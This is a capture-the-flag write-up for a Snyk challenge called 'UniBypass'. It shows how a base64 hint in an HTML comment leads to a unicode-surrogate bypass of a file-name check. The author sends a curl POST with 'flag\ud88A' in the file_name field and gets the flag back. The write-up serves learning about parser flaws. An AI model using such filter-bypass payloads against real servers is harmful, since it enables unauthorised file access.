# UniBypass

If you wanna be my parser, you gotta get with my friend.

## Objective

Just from the title, we can assume, that there is a possible form to fill and bypass.
The languages are python and JavaScript, so I could assume that there will be an interesting script embedded, possibly, into the HTML.


## Resources

***Link***: https://ctf-101.snyk.io/challenges#UniBypass

***Server***: http://35.211.91.235:8000


## Solution

We can retrieve the HTML page with the curl command as follows below:

```
$curl -X GET 35.211.91.235:8000 >> HelloHax0R.html                      
```
***Results***

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3394  100  3394    0     0  13872      0 --:--:-- --:--:-- --:--:-- 13909


If we take a look into the file, we can find two interesting hints.
The first is about the Javascript code that handles the form text to fill.

This script indicates us, that there is a logic regarding the  fetching of the file.


```
<script>
        window.onload = function(){
            document.querySelector('#submit').addEventListener('click', submit);
        }

        async function submit(){
            const file_name = document.querySelector('#file_name').value;
            const response = await fetch('/', {
                method:'POST',
                headers:{
                    'content-type':'application/json'
                },
                body: JSON.stringify({file_name})
            })
            const responseData = await response.json();
            alert(responseData.response);
        }
    </script>

```

In this possible solution, I will go through curl command and not the form text.
This is the command that I will use to exploit the form, changing only the value of *file_name*.


```
$curl -X POST 35.211.91.235:8000/ -H "Content-Type: application/json" -d '{"file_name":"flag"}' 

```

***Response***

{"response":"computer says no"}  or {"response":"it's not that simple"}                                                                                                      
Therefore, let's go for the second hint, a base64 encoded, commented string on the bottom of the page.


```
<!--T25jZSBJIHdhcyBwYXJzaW5nLXllYXJzLW9sZCBteSBtb21teSB0b2xkIG1lCm1ha2Ugc3VyZSB5b3Ugd29yayB3LyBweXRob24gb3IgeW91J2xsIGdldCBsb25lbHkK-->
</body>
</html>

```
If we decode the string with the command base64 showed below:


```
echo "T25jZSBJIHdhcyBwYXJzaW5nLXllYXJzLW9sZCBteSBtb21teSB0b2xkIG1lCm1ha2Ugc3VyZSB5b3Ugd29yayB3LyBweXRob24gb3IgeW91J2xsIGdldCBsb25lbHkK" >> suspiciosString 


base64 -d suspiciosString


```
***Results***

Once I was parsing-years-old my mommy told me
make sure you work w/ python or you'll get lonely

*From this phrase, let's pick up some keywords for reasearch*

A good reasearch could be *parsing w/ unicode bypass*

After a deep browse I found a good article, which describes some invalid character to use https://charbase.com/d86e-unicode-invalid-character.

I tried different values and I assume that the form could be exploited with "flag/ud88*", below an example:

```
curl -X POST "http://35.211.91.235:8000/" -H "Content-Type: application/json" -d '{ "file_name" : "flag\ud88A"}'
```
***Results***

{"response":"SNYK{FLAG}"}






